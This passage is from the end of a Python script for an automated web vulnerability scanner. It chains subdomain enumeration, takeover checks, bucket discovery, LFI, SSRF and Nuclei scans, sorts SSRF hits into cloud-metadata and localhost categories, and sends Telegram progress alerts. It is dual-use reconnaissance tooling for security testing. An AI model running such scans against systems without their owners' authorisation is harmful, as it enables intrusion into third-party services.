            logger.info(
                f"{color.RED}[!] Found {len(vuln_urls)} potential SSRF vulnerabilities:{color.END}"
            )

            if cloud_findings:
                logger.info(
                    f"{color.RED}  Cloud Metadata Endpoints ({len(cloud_findings)}):{color.END}"
                )
                for url in cloud_findings[:3]:
                    logger.info(f"    - {url}")

            if localhost_findings:
                logger.info(
                    f"{color.RED}  Localhost Access ({len(localhost_findings)}):{color.END}"
                )
                for url in localhost_findings[:3]:
                    logger.info(f"    - {url}")

            if protocol_findings:
                logger.info(
                    f"{color.RED}  Protocol Smuggling ({len(protocol_findings)}):{color.END}"
                )
                for url in protocol_findings[:3]:
                    logger.info(f"    - {url}")

            if oob_findings:
                logger.info(
                    f"{color.RED}  Out-of-Band Interactions ({len(oob_findings)}):{color.END}"
                )
                logger.info(
                    f"    - Monitor interactions at: https://{self.interactsh_url}"
                )

            # Save categorized results
            self._save_categorized_results(
                cloud_findings, localhost_findings, protocol_findings, oob_findings
            )

        except Exception as e:
            logger.error(f"{color.RED}[-] Error analyzing results: {e}{color.END}")

    def _save_categorized_results(self, cloud, localhost, protocol, oob):
        """Save categorized results to separate files"""
        try:
            base_dir = f"{self.output_file}/vuln/ssrf"
            os.makedirs(base_dir, exist_ok=True)

            if cloud:
                with open(f"{base_dir}/cloud-metadata.txt", "w") as f:
                    f.write("\n".join(cloud))

            if localhost:
                with open(f"{base_dir}/localhost-access.txt", "w") as f:
                    f.write("\n".join(localhost))

            if protocol:
                with open(f"{base_dir}/protocol-smuggling.txt", "w") as f:
                    f.write("\n".join(protocol))

            if oob:
                with open(f"{base_dir}/oob-interactions.txt", "w") as f:
                    f.write("\n".join(oob))

        except Exception as e:
            logger.error(
                f"{color.RED}[-] Error saving categorized results: {e}{color.END}"
            )

    def _check_tool_installed(self, tool_name):
        """Check if a required tool is installed"""
        try:
            subprocess.run(
                [tool_name, "--help"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            return True
        except FileNotFoundError:
            logger.warning(
                f"{color.RED}[!] {tool_name} not installed, skipping related tests{color.END}"
            )
            return False


class Nuclei:
    """Class to run Nuclei vulnerability scanner"""

    def __init__(self, domains, output_file):
        """
        Initialize with domains file and output directory

        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
        """
        self.domains = domains
        self.output_file = output_file

    def basic_nuclei(self):
        """Run basic Nuclei scan on alive hosts"""
        hosts = f"{self.output_file}/hosts/alive-hosts.txt"
        output = f"{self.output_file}/vuln/nuclei-output.txt"
        try:
            nuclei_cmd = ["nuclei", "-l", hosts, "-o", output]
            logger.info(f"{color.GREEN}(+) Nuclei active scanning {color.END}")
            subprocess.run(nuclei_cmd, shell=True, check=True)
        except Exception as e:
            logger.exception(f"{color.RED}(-) Error occurred: {e}{color.END}")

    def dast_nuclei(self):
        """Run DAST Nuclei scan on all URLs"""
        urls = f"{self.output_file}/urls/all-urls.txt"
        output = f"{self.output_file}/vuln/nuclei-dast-output.txt"
        try:
            nuclei_cmd = f"cat {urls} | nuclei --dast -o {output}"
            subprocess.run(nuclei_cmd, check=True, shell=True)
            logger.info(f"{color.GREEN}(+) Nuclei dast active scanning {color.END}")
        except Exception as e:
            logger.exception(f"{color.RED}(-) Error occurred: {e}{color.END}")


class TelegramNotify:
    def __init__(self, telegram_token, telegram_chat_id):
        self.token = telegram_token
        self.chat_id = telegram_chat_id

    def notify_telegram(self, token, chat_id, message):
        """Send Telegram notification"""
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        payload = {"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}

        response = requests.post(url, json=payload)

        if response.status_code == 200:
            logger.info("Notification sent successfully!")
        else:
            logger.error(
                f"Failed to send notification: {response.status_code} - {response.text}"
            )


class Cleanup:
    """Class to handle cleanup of empty files and directories"""

    def __init__(self, output_file, config):
        """
        Initialize with output directory and config

        Args:
            output_file (str): Path to output directory
            config (dict): Cleanup configuration from YAML
        """
        self.output_file = output_file
        self.config = config.get("cleanup", {})
        self.remove_empty_files = self.config.get("remove_empty_files", True)
        self.remove_empty_dirs = self.config.get("remove_empty_dirs", True)

    @loading_animation(
        f"{color.GREEN}[+] Cleaning up empty files and directories{color.END}"
    )
    def cleanup(self):
        """Remove empty files and directories based on config"""
        try:
            if self.remove_empty_files:
                self._remove_empty_files()
            if self.remove_empty_dirs:
                self._remove_empty_dirs()
            logger.info(f"{color.GREEN}[+] Cleanup completed{color.END}")
        except Exception as e:
            logger.exception(f"{color.RED}Error during cleanup: {e}{color.END}")

    def _remove_empty_files(self):
        """Remove all empty files in the output directory"""
        for root, _, files in os.walk(self.output_file):
            for file in files:
                file_path = os.path.join(root, file)
                if os.path.getsize(file_path) == 0:
                    try:
                        os.remove(file_path)
                        logger.debug(f"Removed empty file: {file_path}")
                    except Exception as e:
                        logger.error(f"Failed to remove {file_path}: {e}")

    def _remove_empty_dirs(self):
        """Remove all empty directories in the output directory"""
        for root, dirs, _ in os.walk(self.output_file, topdown=False):
            for dir_name in dirs:
                dir_path = os.path.join(root, dir_name)
                try:
                    if not os.listdir(dir_path):  # Directory is empty
                        os.rmdir(dir_path)
                        logger.debug(f"Removed empty directory: {dir_path}")
                except Exception as e:
                    logger.error(f"Failed to remove {dir_path}: {e}")


def load_config(config_path="config.yaml"):
    """Load configuration from YAML file"""
    try:
        with open(config_path, "r") as f:
            return yaml.safe_load(f)
    except FileNotFoundError:
        logger.warning(
            f"{color.RED}(!) Config file not found, using defaults{color.END}"
        )
        return {
            "telegram": {"token": "", "chat_id": ""},
            "cleanup": {"remove_empty_files": True, "remove_empty_dirs": True},
        }
    except Exception as e:
        logger.error(f"{color.RED}Error loading config: {e}{color.END}")
        raise


def done():
    print(
        rf"""{color.GREEN}
  ________            _____                     _         ____                        ______                __   __               __      __   _____
 /_  __/ /_  ___     / ___/_________ _____     (_)____   / __ \____  ____  ___       / ____/___  ____  ____/ /  / /   __  _______/ /__   / /  |__  /
  / / / __ \/ _ \    \__ \/ ___/ __ `/ __ \   / / ___/  / / / / __ \/ __ \/ _ \     / / __/ __ \/ __ \/ __  /  / /   / / / / ___/ //_/  / /    /_ <
 / / / / / /  __/   ___/ / /__/ /_/ / / / /  / (__  )  / /_/ / /_/ / / / /  __/    / /_/ / /_/ / /_/ / /_/ /  / /___/ /_/ / /__/ ,<     \ \  ___/ /
/_/ /_/ /_/\___/   /____/\___/\__,_/_/ /_/  /_/____/  /_____/\____/_/ /_/\___(_)   \____/\____/\____/\__,_/  /_____/\__,_/\___/_/|_|     \_\/____/
   {color.END}

"""
    )


def main():
    parser = argparse.ArgumentParser(
        description="Web Application Vulnerability Scanner"
    )
    parser.add_argument(
        "-d", "--domains", help="Path to file containing list of domains"
    )
    parser.add_argument("-o", "--output", help="Output directory name")
    parser.add_argument(
        "-c", "--config", default="config.yaml", help="Path to config file"
    )
    parser.add_argument(
        "--cleanup-only",
        action="store_true",
        help="Run only the cleanup process on existing output directory",
    )
    args = parser.parse_args()

    # Load configuration
    config = load_config(args.config)

    # Get Telegram config from YAML
    telegram_config = config.get("telegram", {})
    telegram_token = telegram_config.get("token", "")
    telegram_chat_id = telegram_config.get("chat_id", "")

    # Create notifier instance
    notifier = TelegramNotify(telegram_token, telegram_chat_id)

    # Handle cleanup-only mode
    if args.cleanup_only:
        if not args.output:
            logger.error(
                f"{color.RED}Error: Output directory (-o) must be specified for cleanup{color.END}"
            )
            return

        try:
            # Just run cleanup and exit
            cleaner = Cleanup(args.output, config)
            cleaner.cleanup()
            notifier.notify_telegram(
                telegram_token, telegram_chat_id, "(+) Cleanup process completed"
            )
            return
        except Exception as e:
            logger.exception("Failed during cleanup")
            notifier.notify_telegram(
                telegram_token, telegram_chat_id, "(-) Cleanup process failed"
            )
            return

    # Validate required arguments for normal scan
    if not args.domains or not args.output:
        logger.error(
            f"{color.RED}Error: Both domains (-d) and output (-o) must be specified for scanning{color.END}"
        )
        return

    domains = args.domains
    output_file = args.output
    pwd = os.getcwd()
    real_time = date.now()
    formatted_time = real_time.strftime("%Y-%m-%d %H:%M:%S")

    notifier.notify_telegram(
        telegram_token,
        telegram_chat_id,
        f"(+) Scan for {domains} Started at {formatted_time}\n" f" Path:{pwd}",
    )

    try:
        # Create directories and notify
        make_dirs = MakeDirectories(output_file)
        make_dirs.mk_dirs()
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, f"(+) Directories created successfully"
        )
        logger.info("Directories created successfully")
    except Exception as e:
        logger.exception("Failed to create directories")
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(-) Failed to create directories"
        )

    try:
        # Execute SubdomainsCollector and notify
        subdomains_collector = SubdomainsCollector(domains, output_file)
        subdomains_collector.subfinder_subs()
        subdomains_collector.probe()
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(+) Subdomain collection completed"
        )
        logger.info("Subdomain collection completed")
    except Exception as e:
        logger.exception("Failed during subdomain collection")
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(-) Subdomain collection failed"
        )

    try:
        # Execute DmarcFinder and notify
        dmarc_finder = DmarcFinder(domains, output_file)
        dmarc_finder.validate_domains()
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(+) DMARC domains validated"
        )
        logger.info("DMARC domains validated")
    except Exception as e:
        logger.exception("Failed during DMARC validation")
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(-) DMARC validation failed"
        )

    try:
        # Execute SubdomainTakeOver and notify
        subdomains_takeover = SubdomainTakeOver(domains, output_file)
        subdomains_takeover.get_cname()
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(+) Subdomain takeover tests completed"
        )
        logger.info("Subdomain takeover tests completed")
    except Exception as e:
        logger.exception("Failed during subdomain takeover tests")
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(-) Subdomain takeover tests failed"
        )

    try:
        # Execute BucketFinder and notify
        bucket_finder = BucketFinder(domains, output_file)
        bucket_finder.buckets_cli()
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(+) BucketFinder scan completed"
        )
    except Exception as e:
        logger.exception("Failed during BucketFinder scan")

    try:
        # Execute `UrlFinder` and notify
        finder = UrlFinder(domains, output_file)
        finder.collect_urls()
        finder.extract_js_files()
        finder.extract_documents()
        finder.extract_js_data_with_mantra()
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(+) URL scan completed"
        )
        logger.info("URL scan completed")
    except Exception as e:
        logger.exception("Failed during URL scan")
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(-) URL scan failed"
        )

    try:
        # Execute LFI and notify
        lfi = LFI(domains, output_file)
        lfi.run_all()
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(+) LFI test completed"
        )
        logger.info("LFI test completed")
    except Exception as e:
        logger.exception("Failed during LFI test")
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(-) LFI test failed"
        )

    try:
        # Execute SSRF and notify
        ssrf = SSRF(domains, output_file)
        ssrf.ssrf_cli()
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(+) SSRF test completed"
        )
        logger.info("SSRF test completed")
    except Exception as e:
        logger.exception("Failed during SSRF test")
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(-) SSRF test failed"
        )

    try:
        # Execute Nuclei and notify
        nuclei = Nuclei(domains, output_file)
        nuclei.basic_nuclei()
        nuclei.dast_nuclei()
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(+) Nuclei scan completed"
        )
        logger.info("Nuclei scan completed")
    except Exception as e:
        logger.exception("Failed during Nuclei scan")
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(-) Nuclei scan failed"
        )

    try:
        # The scan is done, notify
        finder.download_and_scan_js()

        # Run cleanup if configured
        if config.get("cleanup", {}).get("enabled", True):
            cleaner = Cleanup(output_file, config)
            cleaner.cleanup()

        done()
        notifier.notify_telegram(
            telegram_token,
            telegram_chat_id,
            "(+) Web Application Vulnerability Scan Completed",
        )
        logger.info("Web Application Vulnerability Scan Completed")
    except Exception as e:
        logger.exception("Failed during final scan steps")
        notifier.notify_telegram(
            telegram_token,
            telegram_chat_id,
            "(-) Web Application Vulnerability Scan failed to complete",
        )


if __name__ == "__main__":
    main()
